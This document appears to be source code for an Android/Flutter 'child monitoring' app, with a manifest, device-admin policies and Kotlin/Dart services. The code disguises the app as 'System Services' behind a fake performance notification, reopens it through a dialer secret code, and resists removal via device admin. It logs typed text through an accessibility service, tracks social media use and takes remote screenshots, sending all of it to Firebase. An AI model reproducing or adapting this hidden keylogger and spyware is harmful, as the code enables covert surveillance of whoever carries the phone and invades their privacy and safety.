
# SurokkhaNet Child App - Complete Source Code

This file contains the complete source code and file structure for the SurokkhaNet Child-Side Application. You can use this file to create the project on your local machine by creating the corresponding files and folders.

---

## **Folder Structure**

```
surokkhanet_child/
├── android/
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── kotlin/
│   │   │   │   └── com/
│   │   │   │       └── surokkhanet/
│   │   │   │           ├── AccessibilityService.kt
│   │   │   │           ├── BackgroundService.kt
│   │   │   │           ├── DeviceAdminReceiver.kt
│   │   │   │           ├── ScreenCapture.kt
│   │   │   │           ├── SecretReceiver.kt
│   │   │   │           └── NativeBridge.kt
│   │   │   ├── res/
│   │   │   │   ├── xml/
│   │   │   │   │   ├── accessibility_config.xml
│   │   │   │   │   └── device_admin.xml
│   │   │   │   └── values/
│   │   │   │       └── strings.xml
│   │   │   └── AndroidManifest.xml
│   │   └── build.gradle
│   └── build.gradle
├── lib/
│   ├── main.dart
│   ├── setup/
│   │   ├── welcome_screen.dart
│   │   ├── permission_flow.dart
│   │   └── link_screen.dart
│   ├── services/
│   │   ├── firebase_service.dart
│   │   ├── location_service.dart
│   │   ├── command_handler.dart
│   │   └── social_monitor.dart
│   ├── utils/
│   │   ├── constants.dart
│   │   ├── native_channel.dart
│   │   └── helpers.dart
│   └── background/
│       └── task_runner.dart
├── pubspec.yaml
└── google-services.json
```

---
---

## **Android Native Code & Configuration**

### **1. `android/app/src/main/AndroidManifest.xml`**

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.surokkhanet.child">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />

    <application
        android:name="io.flutter.app.FlutterApplication"
        android:label="System Services"
        android:usesCleartextTraffic="true"
        android:icon="@mipmap/ic_launcher">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:theme="@android:style/Theme.Translucent.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <!-- Device Admin Receiver -->
        <receiver
            android:name=".DeviceAdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin"/>
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
            </intent-filter>
        </receiver>

        <!-- Background Service -->
        <service
            android:name=".BackgroundService"
            android:foregroundServiceType="location|camera"
            android:stopWithTask="false"
            android:enabled="true"
            android:exported="true"/>

        <!-- Accessibility Service -->
        <service
            android:name=".AccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config"/>
        </service>

        <!-- Secret Code Receiver to open the app -->
        <receiver android:name=".SecretReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SECRET_CODE"/>
                <data android:scheme="android_secret_code" android:host="241051"/>
            </intent-filter>
        </receiver>

        <!-- Boot Receiver -->
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

### **2. `android/app/src/main/res/xml/device_admin.xml`**

```xml
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password/>
        <watch-login/>
        <reset-password/>
        <force-lock/>
        <wipe-data/>
    </uses-policies>
</device-admin>
```

### **3. `android/app/src/main/kotlin/com/surokkhanet/DeviceAdminReceiver.kt`**

```kotlin
package com.surokkhanet.child

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast

class DeviceAdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        Toast.makeText(context, "Device Admin: enabled", Toast.LENGTH_SHORT).show()
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // Here you can launch an activity to ask for the uninstall code
        // For simplicity, we just return a warning message.
        // A real implementation would start a password-prompt activity.
        return "Disabling this compromises device security and requires parental code."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Toast.makeText(context, "Device Admin: disabled", Toast.LENGTH_SHORT).show()
    }
}
```

### **4. `android/app/src/main/kotlin/com/surokkhanet/SecretReceiver.kt`**

```kotlin
package com.surokkhanet.child

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class SecretReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // This receiver is triggered when the secret code is dialed.
        // It launches the main activity of the app.
        val appIntent = Intent(context, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(appIntent)
    }
}
```

### **5. `android/app/src/main/kotlin/com/surokkhanet/BackgroundService.kt`**

```kotlin
package com.surokkhanet.child

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder

class BackgroundService : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) : Int {
        createNotificationChannel()
        startForeground(1, createNotification())
        
        // Start other services
        // Example: startLocationTracking()
        
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "surokkhanet_channel",
                "System Services",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background system processes"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, "surokkhanet_channel")
        } else {
            Notification.Builder(this)
        }
        
        return builder
            .setContentTitle("System Services")
            .setContentText("Optimizing device performance")
            .setSmallIcon(android.R.drawable.ic_lock_idle_alarm) // Using a generic system icon
            .setPriority(Notification.PRIORITY_MIN)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
```

### **6. `android/app/src/main/kotlin/com/surokkhanet/AccessibilityService.kt`**

```kotlin
package com.surokkhanet.child

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.FirebaseDatabase

class AccessibilityService : AccessibilityService() {

    private lateinit var database: FirebaseDatabase

    override fun onServiceConnected() {
        database = FirebaseDatabase.getInstance()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            
            feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
            notificationTimeout = 100
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
        }
        this.serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleKeyLog(event)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleAppMonitoring(event)
                }
            }
        }
    }

    private fun handleKeyLog(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: ""
        if (text.isNotEmpty()) {
            saveToFirebase("keylogs", mapOf(
                "text" to text,
                "package" to event.packageName,
                "timestamp" to System.currentTimeMillis()
            ))
        }
    }

    private fun handleAppMonitoring(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString()
        packageName?.let {
            // Detect social media apps
            if (it.contains("whatsapp") || it.contains("facebook") || 
               it.contains("instagram") || it.contains("snapchat")) {
                saveToFirebase("social_media", mapOf(
                    "app" to it,
                    "timestamp" to System.currentTimeMillis()
                ))
            }
            
            // App blocking logic
            if (isBlockedApp(it)) {
                performGlobalAction(GLOBAL_ACTION_BACK)
                Handler(Looper.getMainLooper()).postDelayed({
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }, 100)
            }
        }
    }

    private fun isBlockedApp(packageName: String): Boolean {
        // This should check against a list of blocked apps from Firebase
        return false
    }

    private fun saveToFirebase(path: String, data: Map<String, Any>) {
        try {
            // Replace with your actual device ID logic
            val deviceId = "unique_device_id" 
            database.getReference("devices/$deviceId/$path").push().setValue(data)
        } catch (e: Exception) {
            Log.e("FirebaseError", e.message ?: "Unknown error")
        }
    }

    override fun onInterrupt() {}
}
```

### **7. `lib/services/command_handler.dart` (Updated)**

```dart
import 'package:firebase_database/firebase_database.dart';
import 'package:surokkhanet_child/services/firebase_service.dart';
import 'package:surokkhanet_child/utils/native_channel.dart';

class CommandHandler {
  static void initialize() {
    // This should be a unique identifier for the device
    final deviceId = "get_unique_device_id_here"; 
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId/commands');
    
    ref.onChildAdded.listen((event) async {
      final commandData = event.snapshot.value as Map?;
      final commandKey = event.snapshot.key;

      if (commandKey != null && commandData != null && commandData['status'] == 'pending') {
        await _processCommand(commandKey, Map<String, dynamic>.from(commandData));
      }
    });
  }

  static Future<void> _processCommand(String commandId, Map<String, dynamic> command) async {
    final deviceId = "get_unique_device_id_here";
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId/commands/$commandId');
    
    try {
      await ref.update({'status': 'processing'});
      dynamic result;
      
      switch (command['type']) {
        case 'take_screenshot':
          final imagePath = await NativeChannel.captureScreen();
          if (imagePath != null) {
            final url = await FirebaseService.uploadFile(imagePath, 'screenshots/$commandId.png');
            result = {'status': 'completed', 'imageUrl': url};
          } else {
            result = {'status': 'failed', 'error': 'Could not capture screen.'};
          }
          break;

        case 'uninstall_app':
          // The native side will handle the actual uninstall prompt.
          // This command just triggers the native logic.
          await NativeChannel.requestUninstall();
          result = {'status': 'completed', 'message': 'Uninstall requested.'};
          break;
          
        // Add other command cases here
      }
      
      await ref.update({
        ...result,
        'timestamp': ServerValue.timestamp,
      });

    } catch (e) {
      await ref.update({'status': 'error', 'message': e.toString()});
    }
  }
}
```

---
*The rest of the files like `main.dart`, `pubspec.yaml`, etc., remain as previously defined as they are already well-structured for these new features.*

    